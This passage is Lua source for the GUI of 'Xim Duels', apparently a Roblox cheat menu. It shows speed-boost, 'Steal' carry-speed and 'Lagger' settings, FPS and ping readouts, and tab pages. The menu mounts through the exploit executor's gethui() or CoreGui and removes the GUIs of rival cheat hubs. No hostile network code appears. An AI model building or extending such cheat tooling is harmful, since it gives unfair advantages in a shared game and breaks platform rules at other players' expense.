    local function paintStatus()
        local on = M.speedBoosterEnabled ~= false
        statusBtn.Text = on and "ON" or "OFF"
        if on then statusBtn.BackgroundColor3 = ACCENT; statusBtn.TextColor3 = Color3.fromRGB(10,12,14)
        else statusBtn.BackgroundColor3 = Color3.fromRGB(30,32,38); statusBtn.TextColor3 = Color3.fromRGB(160,160,170) end
    end
    paintStatus()
    statusBtn.MouseButton1Click:Connect(function()
        M.speedBoosterEnabled = not (M.speedBoosterEnabled ~= false)
        paintStatus()
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        pcall(saveCherryConfig)
    end)

    local speedRow = makeValueRow(60, "Speed")
    local speedBox = Instance.new("TextBox")
    speedBox.Size = UDim2.new(0, 48, 0, 18)
    speedBox.Position = UDim2.new(1, -54, 0.5, -9)
    speedBox.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    speedBox.BorderSizePixel = 0
    speedBox.TextColor3 = ACCENT
    speedBox.Font = Enum.Font.GothamBold
    speedBox.TextSize = 10
    speedBox.ClearTextOnFocus = false
    speedBox.Parent = speedRow
    Instance.new("UICorner", speedBox).CornerRadius = UDim.new(0, 6)

    local stealRow = makeValueRow(90, "Steal")
    local stealBox = Instance.new("TextBox")
    stealBox.Size = UDim2.new(0, 48, 0, 18)
    stealBox.Position = UDim2.new(1, -54, 0.5, -9)
    stealBox.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    stealBox.BorderSizePixel = 0
    stealBox.TextColor3 = ACCENT
    stealBox.Font = Enum.Font.GothamBold
    stealBox.TextSize = 10
    stealBox.ClearTextOnFocus = false
    stealBox.Parent = stealRow
    Instance.new("UICorner", stealBox).CornerRadius = UDim.new(0, 6)

    local function refreshBoxes()
        if path == "Lagger" then
            speedBox.Text = tostring(M.LAGGER_SPEED)
            stealBox.Text = tostring(M.LAGGER_CARRY_SPEED)
        else
            speedBox.Text = tostring(M.NS)
            stealBox.Text = tostring(M.CS)
        end
    end
    refreshBoxes()

    local function applyPath(forcePath, fromSync)
        if forcePath == "Lagger" or forcePath == "Normal" then
            path = forcePath
        end
        M.speedBoosterPath = path
        M.speedBoosterEnabled = true
        if not fromSync then
            if paintStatus then paintStatus() end
        end
        -- clear carry flags; path is the single source of truth
        M.carrySpeedActive = false
        M.laggerCarryActive = false
        M.laggerModeEnabled = (path == "Lagger")
        if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
        if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
        if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(M.laggerModeEnabled) end) end
        if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end) end
        if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end) end
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        refreshBoxes(); paintSeg()
        if not fromSync then pcall(saveCherryConfig) end
    end

    
    M.speedBoosterSyncPath = function(newPath)
        if newPath ~= "Lagger" and newPath ~= "Normal" then return end
        path = newPath
        M.speedBoosterPath = path
        paintSeg()
        refreshBoxes()
    end

    normalBtn.MouseButton1Click:Connect(function() applyPath("Normal") end)
    laggerBtn.MouseButton1Click:Connect(function() applyPath("Lagger") end)
    speedBox.FocusLost:Connect(function()
        local n = tonumber(speedBox.Text)
        if n and n >= 1 and n <= 500 then
            if path == "Lagger" then M.LAGGER_SPEED = n else M.NS = n end
            speedBox.Text = tostring(n); pcall(saveCherryConfig)
        else refreshBoxes() end
    end)
    stealBox.FocusLost:Connect(function()
        local n = tonumber(stealBox.Text)
        if n and n >= 1 and n <= 500 then
            if path == "Lagger" then M.LAGGER_CARRY_SPEED = n else M.CS = n end
            stealBox.Text = tostring(n); pcall(saveCherryConfig)
        else refreshBoxes() end
    end)

    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(1, 0, 0, 22)
    resetBtn.Position = UDim2.new(0, 0, 0, 120)
    resetBtn.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
    resetBtn.BorderSizePixel = 0
    resetBtn.Text = "RESET POS"
    resetBtn.TextColor3 = ACCENT
    resetBtn.Font = Enum.Font.GothamBold
    resetBtn.TextSize = 9
    resetBtn.AutoButtonColor = false
    resetBtn.Parent = body
    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 6)
    resetBtn.MouseButton1Click:Connect(function() M.resetSpeedBoosterPosition() end)

    M.normalBox = speedBox; M.carryBox = stealBox; M.laggerBox = speedBox
    M.speedBoosterRefresh = refreshBoxes
    M.speedBoosterPaintStatus = paintStatus
    M.speedBoosterApplyPath = applyPath
    applyPath(path, true)
end

function M.setSpeedBoosterPanelOpen(on)
    M.speedBoosterPanelOpen = on and true or false
    if not M.speedBoosterMain then pcall(M.buildSpeedBoosterUI) end
    if M.speedBoosterMain then
        local show = M.speedBoosterPanelOpen and (M.speedUIMode or "Original") ~= "Original"
        M.speedBoosterMain.Visible = show
    end
    pcall(saveCherryConfig)
end

function M.buildGui()
    if M._buildingGui then return end
    M._buildingGui = true
    M.uiLocked = false
    applyAccentFromTheme()
    M.clearPersistentConns()

    local _killNames = {"MoveeDuels","Cherry_Menu","K7HubGUI","VantaHubUI","VynxHubUI","AceDuelsAdaptReconstruct","VynxStatusUI","VynxTopBanner"}
    local function _killGui(parent)
        if not parent then return end
        for _, n in ipairs(_killNames) do
            local o = parent:FindFirstChild(n)
            if o then pcall(function() o:Destroy() end) end
        end
    end
    pcall(function() _killGui(game:GetService("CoreGui")) end)
    pcall(function() _killGui(player:FindFirstChild("PlayerGui")) end)
    pcall(function() if gethui then _killGui(gethui()) end end)
    if M.gui and M.gui.Parent then pcall(function() M.gui:Destroy() end) end
    M.gui = nil
    M.mainFrame = nil

    M.buildStatusUI()
    pcall(function() if M.topBannerGui then M.topBannerGui:Destroy() end; M.topBannerGui=nil end)

    local gui = Instance.new("ScreenGui")
    gui.Name = "XimDuelsUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    do
        local ok = false
        if gethui then ok = pcall(function() gui.Parent = gethui() end) end
        if not ok then ok = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
        if not ok then gui.Parent = player:WaitForChild("PlayerGui") end
    end
    M.gui = gui

    -- VOID-style shell (plain black)
    local MAIN_W, MAIN_H = 400, 528
    local HEADER_H = 64
    local CAT_BAR_H = 48
    local SIDE_W = 0

    local Frame = Instance.new("Frame")
    Frame.Name = "Frame"
    Frame.ClipsDescendants = true
    Frame.AnchorPoint = Vector2.new(0, 0)
    -- always default position (do not restore saved menu pos on rejoin)
    Frame.Position = UDim2.new(0, 14, 0, 10)
    Frame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    -- Coach-style shell: deep dark + white outline
    -- 7UP-style glass shell (Red Xim / Purple Xim)
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BackgroundTransparency = 0.22
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Parent = gui
    M.mainFrame = Frame

    local UIScale = Instance.new("UIScale")
    UIScale.Name = "BDUIScale"
    UIScale.Scale = tonumber(M.uiScale) or 0.5
    UIScale.Parent = Frame
    M.uiScaleRef = UIScale

    -- Soft rounded sides (not square box)
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 16)
    do
        local stroke = Instance.new("UIStroke")
        stroke.Name = "MainStroke"
        stroke.Color = UI_ACCENT or Color3.fromRGB(255,255,255)
        stroke.Thickness = 1.2
        stroke.Transparency = 0.35
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = Frame
        local glow = Instance.new("UIStroke")
        glow.Name = "MainGlow"
        glow.Color = UI_ACCENT or Color3.fromRGB(255,255,255)
        glow.Thickness = 4
        glow.Transparency = 0.82
        glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        glow.Parent = Frame
    end
    -- NO dark overlay on background image (user request)
    do
        local ov = Instance.new("Frame")
        ov.Name = "CoachOverlay"
        ov.Size = UDim2.new(1, 0, 1, 0)
        ov.BackgroundTransparency = 1
        ov.BorderSizePixel = 0
        ov.ZIndex = 1
        ov.Parent = Frame
        Instance.new("UICorner", ov).CornerRadius = UDim.new(0, 32)
    end

    local LeftPanel = Instance.new("Frame")
    LeftPanel.Name = "LeftImagePanel"
    LeftPanel.Size = UDim2.new(1, 0, 1, 0)
    LeftPanel.BackgroundTransparency = 1
    LeftPanel.BorderSizePixel = 0
    LeftPanel.ClipsDescendants = true
    LeftPanel.ZIndex = 1
    LeftPanel.Parent = Frame
    Instance.new("UICorner", LeftPanel).CornerRadius = UDim.new(0, 28)
    M.leftImagePanel = LeftPanel
    M.applyCustomBackground(Frame)

    local ContentRoot = Instance.new("Frame")
    ContentRoot.Name = "ContentRoot"
    ContentRoot.Size = UDim2.new(1, 0, 1, 0)
    ContentRoot.BackgroundTransparency = 1
    ContentRoot.BorderSizePixel = 0
    ContentRoot.ClipsDescendants = true
    ContentRoot.ZIndex = 2
    ContentRoot.Parent = Frame
    Instance.new("UICorner", ContentRoot).CornerRadius = UDim.new(0, 32)
    M.contentRoot = ContentRoot

    local mark = Instance.new("TextLabel")
    mark.Name = "WatermarkX"
    mark.BackgroundTransparency = 1
    mark.Text = "X"
    mark.Font = Enum.Font.GothamBlack
    mark.TextSize = 220
    mark.TextColor3 = UI_ACCENT or Color3.fromRGB(255,255,255)
    mark.TextTransparency = 1
    mark.Visible = false
    mark.Rotation = -12
    mark.Size = UDim2.new(0, 220, 0, 220)
    mark.Position = UDim2.new(1, -200, 1, -210)
    mark.ZIndex = 3
    mark.Parent = ContentRoot


    local Header = Instance.new("Frame")
    Header.Name = "HeaderPanel"
    Header.Size = UDim2.new(1, 0, 0, HEADER_H)
    Header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Header.BackgroundTransparency = 1
    Header.BorderSizePixel = 0
    Header.Active = true
    Header.ZIndex = 5
    Header.Parent = ContentRoot
    M.headerPanel = Header
    Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 16)
    Header.BackgroundTransparency = 1

    -- logo removed

    local titleLbl = Instance.new("TextLabel")
    titleLbl.ZIndex = 6
    titleLbl.Position = UDim2.new(0, 16, 0, 8)
    titleLbl.Size = UDim2.new(0.62, 0, 0, 28)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = "Xim Duels"
    titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLbl.TextSize = 20
    titleLbl.Font = Enum.Font.GothamBlack
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.TextYAlignment = Enum.TextYAlignment.Center
    titleLbl.Parent = Header
local sub = Instance.new("TextLabel")
    sub.Name = "HeaderSub"
    sub.BackgroundTransparency = 1
    sub.Size = UDim2.new(0.62, 0, 0, 16)
    sub.Position = UDim2.new(0, 16, 0, 36)
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.Text = "discord.gg/ximhub"
    sub.Visible = true
    sub.TextColor3 = Color3.fromRGB(180, 180, 185)
    sub.TextTransparency = 0.15
    sub.Font = Enum.Font.GothamMedium
    sub.TextSize = 11
    sub.ZIndex = 7
    sub.Parent = Header
    M.headerSubLbl = sub
    M.headerTitleLbl = titleLbl

    -- Strip under title: FPS (left) ........................ MS (right)
    local statsStrip = Instance.new("Frame")
    statsStrip.Name = "StatsStrip"
    statsStrip.ZIndex = 6
    statsStrip.Position = UDim2.new(0, 14, 0, 32)
    statsStrip.Size = UDim2.new(1, -90, 0, 20)
    statsStrip.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
    statsStrip.BackgroundTransparency = 0.15
    statsStrip.BorderSizePixel = 0
    statsStrip.ClipsDescendants = true
    statsStrip.Visible = false
    statsStrip.Parent = Header
    Instance.new("UICorner", statsStrip).CornerRadius = UDim.new(0, 6)
    do
        local st = Instance.new("UIStroke")
        st.Color = Color3.fromRGB(70, 70, 75)
        st.Thickness = 1
        st.Transparency = 0.35
        st.Parent = statsStrip
    end

    local fpsLbl = Instance.new("TextLabel")
    fpsLbl.Name = "FpsLbl"
    fpsLbl.ZIndex = 7
    fpsLbl.Size = UDim2.new(0.5, -6, 1, 0)
    fpsLbl.Position = UDim2.new(0, 8, 0, 0)
    fpsLbl.BackgroundTransparency = 1
    fpsLbl.Text = "FPS: --"
    fpsLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    fpsLbl.TextSize = 11
    fpsLbl.Font = Enum.Font.GothamBold
    fpsLbl.TextXAlignment = Enum.TextXAlignment.Left
    fpsLbl.TextYAlignment = Enum.TextYAlignment.Center
    fpsLbl.Parent = statsStrip
    M.headerFpsLbl = fpsLbl

    local msLbl = Instance.new("TextLabel")
    msLbl.Name = "MsLbl"
    msLbl.ZIndex = 7
    msLbl.Size = UDim2.new(0.5, -6, 1, 0)
    msLbl.Position = UDim2.new(0.5, 0, 0, 0)
    msLbl.BackgroundTransparency = 1
    msLbl.Text = "MS: --"
    msLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    msLbl.TextSize = 11
    msLbl.Font = Enum.Font.GothamBold
    msLbl.TextXAlignment = Enum.TextXAlignment.Right
    msLbl.TextYAlignment = Enum.TextYAlignment.Center
    msLbl.Parent = statsStrip
    M.headerMsLbl = msLbl

    -- keep legacy ref for any other code paths
    local statsLbl = Instance.new("TextLabel")
    statsLbl.Visible = false
    statsLbl.Parent = Header
    M.headerStatsLbl = statsLbl

    -- Live FPS / MS for menu strip under title
    do
        if M._headerStatsConn then
            pcall(function() M._headerStatsConn:Disconnect() end)
            M._headerStatsConn = nil
        end
        local last = tick()
        local frames = 0
        local fps = 60
        M._headerStatsConn = RunService.RenderStepped:Connect(function()
            frames = frames + 1
            local now = tick()
            if now - last < 0.35 then return end
            fps = math.floor(frames / (now - last) + 0.5)
            frames = 0
            last = now
            local pingMs = 0
            pcall(function()
                pingMs = math.floor(player:GetNetworkPing() * 1000 + 0.5)
            end)
            if M.headerFpsLbl and M.headerFpsLbl.Parent then
                M.headerFpsLbl.Text = string.format("FPS: %d", fps)
            end
            if M.headerMsLbl and M.headerMsLbl.Parent then
                M.headerMsLbl.Text = string.format("MS: %d", pingMs)
            end
            if M.headerStatsLbl and M.headerStatsLbl.Parent then
                M.headerStatsLbl.Text = string.format("FPS: %d  |  MS: %d", fps, pingMs)
            end
        end)
    end

    local radVal = Instance.new("TextLabel")
    radVal.Visible = false
    radVal.Parent = Header
    M.headerRadiusLbl = radVal

    -- Discord strip under FPS/MS
    local discordStrip = Instance.new("Frame")
    discordStrip.Name = "DiscordStrip"
    discordStrip.ZIndex = 6
    discordStrip.Position = UDim2.new(0, 14, 0, 56)
    discordStrip.Size = UDim2.new(1, -90, 0, 20)
    discordStrip.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
    discordStrip.BackgroundTransparency = 0.15
    discordStrip.BorderSizePixel = 0
    discordStrip.ClipsDescendants = true
    discordStrip.Visible = false
    discordStrip.Parent = Header
    Instance.new("UICorner", discordStrip).CornerRadius = UDim.new(0, 6)
    do
        local st = Instance.new("UIStroke")
        st.Color = Color3.fromRGB(70, 70, 75)
        st.Thickness = 1
        st.Transparency = 0.35
        st.Parent = discordStrip
    end
    local headerDisc = Instance.new("TextLabel")
    headerDisc.Name = "HeaderDiscord"
    headerDisc.Size = UDim2.new(1, -12, 1, 0)
    headerDisc.Position = UDim2.new(0, 8, 0, 0)
    headerDisc.BackgroundTransparency = 1
    headerDisc.Text = "xim duels"
    headerDisc.TextColor3 = Color3.fromRGB(255, 255, 255)
    headerDisc.Font = Enum.Font.GothamBold
    headerDisc.TextSize = 11
    headerDisc.TextXAlignment = Enum.TextXAlignment.Left
    headerDisc.TextYAlignment = Enum.TextYAlignment.Center
    headerDisc.ZIndex = 7
    headerDisc.Parent = discordStrip
    M.headerDiscordLbl = headerDisc

    -- Minimize (-) a bit left of the destroy X
    local MinBtn = Instance.new("TextButton")
    MinBtn.Name = "CloseBtn"
    MinBtn.Size = UDim2.new(0, 36, 0, 36)
    MinBtn.Position = UDim2.new(1, -48, 0, 10)
    MinBtn.BackgroundColor3 = UI_ACCENT or Color3.fromRGB(160, 80, 160)
    MinBtn.BackgroundTransparency = 0
    MinBtn.BorderSizePixel = 0
    MinBtn.Text = "-"
    MinBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
    MinBtn.TextTransparency = 0
    MinBtn.TextSize = 20
    MinBtn.Font = Enum.Font.GothamBlack
    MinBtn.AutoButtonColor = false
    MinBtn.ZIndex = 50
    MinBtn.Parent = Header
    Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 10)
    MinBtn:SetAttribute("NoTheme", true)
    MinBtn.MouseEnter:Connect(function()
        MinBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 44)
        MinBtn.Text = "-"
        MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
    MinBtn.MouseLeave:Connect(function()
        MinBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        MinBtn.Text = "-"
        MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    -- Destroy menu (X) on the far right
    local DestroyBtn = Instance.new("TextButton")
    DestroyBtn.Name = "DestroyBtn"
    DestroyBtn.Size = UDim2.new(0, 22, 0, 22)
    DestroyBtn.Position = UDim2.new(1, -62, 0, 10)
    DestroyBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 24)
    DestroyBtn.Visible = false
    DestroyBtn.BackgroundTransparency = 0
    DestroyBtn.BorderSizePixel = 0
    DestroyBtn.Text = "X"
    DestroyBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    DestroyBtn.TextTransparency = 0
    DestroyBtn.TextSize = 14
    DestroyBtn.Font = Enum.Font.GothamBlack
    DestroyBtn.AutoButtonColor = false
    DestroyBtn.ZIndex = 50
    DestroyBtn.Parent = Header
    Instance.new("UICorner", DestroyBtn).CornerRadius = UDim.new(0, 8)
    DestroyBtn:SetAttribute("NoTheme", true)
    DestroyBtn.MouseEnter:Connect(function()
        DestroyBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
        DestroyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
    DestroyBtn.MouseLeave:Connect(function()
        DestroyBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        DestroyBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    end)
    DestroyBtn.MouseButton1Click:Connect(function()
        M.menuOpen = false
        pcall(function()
            if M.gui then M.gui:Destroy() end
        end)
        M.gui = nil
        M.mainFrame = nil
        pcall(function()
            if MinPill then MinPill:Destroy() end
        end)
    end)
    M.destroyMenuBtn = DestroyBtn

    local lockButton = Instance.new("TextButton")
    lockButton.Size = UDim2.new(0, 0, 0, 0)
    lockButton.Visible = false
    lockButton.Parent = Header
    local locked = false
    lockButton.Activated:Connect(function()
        locked = not locked
        M.uiLocked = false
        saveCherryConfig()
    end)

    -- Bottom category tabs (not vertical sidebar)
    M.sideBarPanel = nil

    -- right drag strip (like EvadeDuels photo)
    local dragStrip = Instance.new("Frame")
    dragStrip.Name = "RightDragStrip"
    dragStrip.Size = UDim2.new(0, 3, 1, -(HEADER_H + 20))
    dragStrip.Position = UDim2.new(1, -10, 0, HEADER_H + 10)
    dragStrip.BackgroundColor3 = Color3.fromRGB(55, 55, 58)
    dragStrip.BackgroundTransparency = 0.45
    dragStrip.BorderSizePixel = 0
    dragStrip.ZIndex = 6
    dragStrip.Visible = false
    dragStrip.Parent = ContentRoot
    Instance.new("UICorner", dragStrip).CornerRadius = UDim.new(1, 0)

    local masterScroll = Instance.new("ScrollingFrame")
    masterScroll.Name = "AllPage"
    masterScroll.BackgroundTransparency = 1
    masterScroll.BorderSizePixel = 0
    masterScroll.Position = UDim2.new(0, 12, 0, HEADER_H + 4)
    masterScroll.Size = UDim2.new(1, -24, 1, -(HEADER_H + CAT_BAR_H + 22))
    masterScroll.ScrollBarThickness = 4
    masterScroll.ScrollBarImageColor3 = Color3.fromRGB(200, 200, 200)
    masterScroll.ScrollBarImageTransparency = 0.35
    masterScroll.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
    masterScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    masterScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    masterScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    masterScroll.ElasticBehavior = Enum.ElasticBehavior.Never
    masterScroll.ZIndex = 3
    masterScroll.Parent = ContentRoot
    local masterLayout = Instance.new("UIListLayout")
    masterLayout.Padding = UDim.new(0, 6)
    masterLayout.SortOrder = Enum.SortOrder.LayoutOrder
    masterLayout.Parent = masterScroll
    local masterPad = Instance.new("UIPadding")
    masterPad.PaddingTop = UDim.new(0, 10)
    masterPad.PaddingBottom = UDim.new(0, 15)
    masterPad.PaddingLeft = UDim.new(0, 4)
    masterPad.PaddingRight = UDim.new(0, 4)
    masterPad.Parent = masterScroll

    local BottomSep = Instance.new("Frame")
    BottomSep.Visible = false
    BottomSep.Parent = ContentRoot

    -- Left sidebar MENU (EvadeDuels-style)
    local CategoryBar = Instance.new("ScrollingFrame")
    CategoryBar.Name = "CategoryBar"
    CategoryBar.Position = UDim2.new(0, 10, 1, -(CAT_BAR_H + 8))
    CategoryBar.Size = UDim2.new(1, -20, 0, CAT_BAR_H)
    CategoryBar.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    CategoryBar.BackgroundTransparency = 0.25
    CategoryBar.BorderSizePixel = 0
    CategoryBar.ScrollBarThickness = 0
    CategoryBar.ScrollingDirection = Enum.ScrollingDirection.X
    CategoryBar.CanvasSize = UDim2.new(0, 0, 0, 0)
    CategoryBar.AutomaticCanvasSize = Enum.AutomaticSize.Y
    CategoryBar.ElasticBehavior = Enum.ElasticBehavior.Never
    CategoryBar.ZIndex = 8
    CategoryBar.Parent = ContentRoot
    Instance.new("UICorner", CategoryBar).CornerRadius = UDim.new(0, 18)
    M.categoryBar = CategoryBar
    do
        local cst = Instance.new("UIStroke")
        cst.Name = "SideStroke"
        cst.Color = Color3.fromRGB(70, 70, 75)
        cst.Thickness = 1.2
        cst.Transparency = 0.3
        cst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        cst.Parent = CategoryBar
    end
    do
        local pageTitle = Instance.new("TextLabel")
        pageTitle.Name = "PageTitle"
        pageTitle.Size = UDim2.new(1, -(SIDE_W + 24), 0, 26)
        pageTitle.Position = UDim2.new(0, SIDE_W + 14, 0, HEADER_H + 8)
        pageTitle.BackgroundTransparency = 1
        pageTitle.Text = ""
        pageTitle.Visible = false
        pageTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        pageTitle.Font = Enum.Font.GothamBlack
        pageTitle.TextSize = 17
        pageTitle.TextXAlignment = Enum.TextXAlignment.Left
        pageTitle.ZIndex = 6
        pageTitle.Parent = ContentRoot
        M.pageTitleLbl = pageTitle
    end
    local menuLbl = Instance.new("TextLabel")
    menuLbl.Size = UDim2.new(1, -8, 0, 22)
    menuLbl.Position = UDim2.new(0, 4, 0, 4)
    menuLbl.BackgroundTransparency = 1
    menuLbl.Text = ""
    menuLbl.Visible = false
    menuLbl.TextColor3 = Color3.fromRGB(120, 120, 120)
    menuLbl.Font = Enum.Font.GothamBold
    menuLbl.TextSize = 11
    menuLbl.TextXAlignment = Enum.TextXAlignment.Left
    menuLbl.ZIndex = 9
    menuLbl.Parent = CategoryBar
    local CatBarLayout = Instance.new("UIListLayout")
    CatBarLayout.FillDirection = Enum.FillDirection.Horizontal
    CatBarLayout.SortOrder = Enum.SortOrder.LayoutOrder
    CatBarLayout.Padding = UDim.new(0, 4)
    CatBarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    CatBarLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    CatBarLayout.Parent = CategoryBar
    local CatBarPad = Instance.new("UIPadding")
    CatBarPad.PaddingLeft = UDim.new(0, 0)
    CatBarPad.PaddingRight = UDim.new(0, 0)
    CatBarPad.PaddingTop = UDim.new(0, 0)
    CatBarPad.PaddingBottom = UDim.new(0, 0)
    CatBarPad.Parent = CategoryBar

    local tabList = CategoryBar


    local layoutOrder = 0
    local function addSectionDivider(title)
        -- no dividers with tab system (kept as no-op for compatibility)
        return
    end

    local function makeAllPage(name)
        layoutOrder = layoutOrder + 1
        local p = Instance.new("Frame")
        p.Name = name
        p.BackgroundTransparency = 1
        p.BorderSizePixel = 0
        p.Size = UDim2.new(1, 0, 0, 0)
        p.AutomaticSize = Enum.AutomaticSize.Y
        p.LayoutOrder = layoutOrder
        p.ZIndex = 3
        p.Visible = false
        p.Parent = masterScroll
        local l = Instance.new("UIListLayout")
        l.Padding = UDim.new(0, 7)
        l.SortOrder = Enum.SortOrder.LayoutOrder
        l.Parent = p
        local pd = Instance.new("UIPadding")
        pd.PaddingTop = UDim.new(0, 2)
        pd.PaddingBottom = UDim.new(0, 8)
        pd.Parent = p
        return p
    end

    addSectionDivider("MOVEMENT")
    local PM = makeAllPage("Page_SPEED")
    addSectionDivider("STUFF")
    local PMech = makeAllPage("Page_MECHANICS")
    addSectionDivider("VISUALS")
    local PVis = makeAllPage("Page_VISUALS")
    addSectionDivider("ANIM")
    local PAnim = makeAllPage("Page_ANIMATION")
    addSectionDivider("SETTINGS")
    local PSet = makeAllPage("Page_SETTINGS")
    addSectionDivider("CONFIG")
    local PUtil = PSet
    addSectionDivider("KEYS")
    local PKB = makeAllPage("Page_KEYBINDS")

    local Pages = {SPEED=PM, MECHANICS=PMech, VISUALS=PVis, ANIM=PAnim, SETTINGS=PSet, KEYBINDS=PKB}
    local tabOrder = {"SPEED", "MECHANICS", "VISUALS", "ANIM", "SETTINGS", "KEYBINDS"}
    local tabLabels = {
        SPEED = "MAIN",
        MECHANICS = "COMBAT",
        VISUALS = "VISUALS",
        ANIM = "ANIMS",
        SETTINGS = "CONFIG",
        KEYBINDS = "KEYS",
    }
    -- Photo-style: Speed | Combat | Steal→Combat | Move→Combat | Visual | Ping→Set | Set
    local tabButtons = {}
    M.tabButtonRefs = tabButtons
    local currentTab = "SPEED"
    M._currentTabName = currentTab

    local function selectTab(name)
        currentTab = name
        M._currentTabName = name
        for k, page in pairs(Pages) do
            page.Visible = (k == name)
        end
        if M.pageTitleLbl then
            M.pageTitleLbl.Text = string.upper(tabLabels[name] or name)
        end
        for k, btn in pairs(tabButtons) do
            local on = (k == name)
            -- EvadeDuels: selected light cell + | bar; unselected near-black (almost invisible gray)
            btn.BackgroundTransparency = 1
            btn.TextColor3 = on and Color3.fromRGB(255,255,255) or Color3.fromRGB(140,140,148)
            local bg = btn:FindFirstChild("ActiveBg")
            if bg then
                bg.BackgroundColor3 = Color3.fromRGB(255,255,255)
                bg.BackgroundTransparency = on and 0.82 or 1
            end
            local und = btn:FindFirstChild("TabUnder")
            if und then
                und.BackgroundTransparency = on and 0 or 0.75
                und.BackgroundColor3 = on and Color3.fromRGB(255,255,255) or Color3.fromRGB(80,80,85)
            end
            local st = btn:FindFirstChildOfClass("UIStroke")
            if st then st.Transparency = 1 end
        end
        masterScroll.CanvasPosition = Vector2.new(0, 0)
    end
    M.selectTab = selectTab

    for i, name in ipairs(tabOrder) do
        local btn = Instance.new("TextButton")
        btn.Name = "Tab_" .. name
        btn.Size = UDim2.new(0, 58, 0, 36)
        btn.BackgroundColor3 = Color3.fromRGB(163, 162, 165)
        btn.BackgroundTransparency = 1
        btn.BorderSizePixel = 0
        btn.Text = tabLabels[name] or name
        btn.TextColor3 = Color3.fromRGB(140, 140, 148)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 9
        btn.TextXAlignment = Enum.TextXAlignment.Center
        btn.AutoButtonColor = false
        btn.ZIndex = 9
        btn.LayoutOrder = i
        btn.Parent = tabList
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        local ab = Instance.new("Frame")
        ab.Name = "ActiveBg"
        ab.Size = UDim2.new(1,0,1,0)
        ab.BackgroundColor3 = Color3.fromRGB(156,158,164)
        ab.BackgroundTransparency = 1
        ab.BorderSizePixel = 0
        ab.ZIndex = 8
        ab.Parent = btn
        Instance.new("UICorner", ab).CornerRadius = UDim.new(0, 8)
        local und = Instance.new("Frame")
        und.Name = "TabUnder"
        und.Size = UDim2.new(0.5, 0, 0, 3)
        und.Position = UDim2.new(0.5, 0, 0, 2)
        und.AnchorPoint = Vector2.new(0.5, 0)
        und.BackgroundColor3 = Color3.fromRGB(208,208,213)
        und.BackgroundTransparency = 0.68
        und.BorderSizePixel = 0
        und.ZIndex = 13
        und.Parent = btn
        Instance.new("UICorner", und).CornerRadius = UDim.new(0, 2)
        local st = Instance.new("UIStroke", btn)
        st.Transparency = 1
        st.Color = Color3.fromRGB(70, 70, 75)
        st.Thickness = 1.3
        st.Transparency = 0.25
        st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        btn.MouseButton1Click:Connect(function() selectTab(name) end)
        tabButtons[name] = btn
    end
    selectTab("SPEED")
    M.allPageScroll = masterScroll


    -- close / minimize
    local function closeUI()
        local tween = TweenService:Create(Frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, MAIN_W, 0, 0),
            Position = Frame.Position + UDim2.new(0, 0, 0, MAIN_H/2),
            BackgroundTransparency = 1
        })
        tween:Play()
        tween.Completed:Connect(function()
            Frame.Visible = false
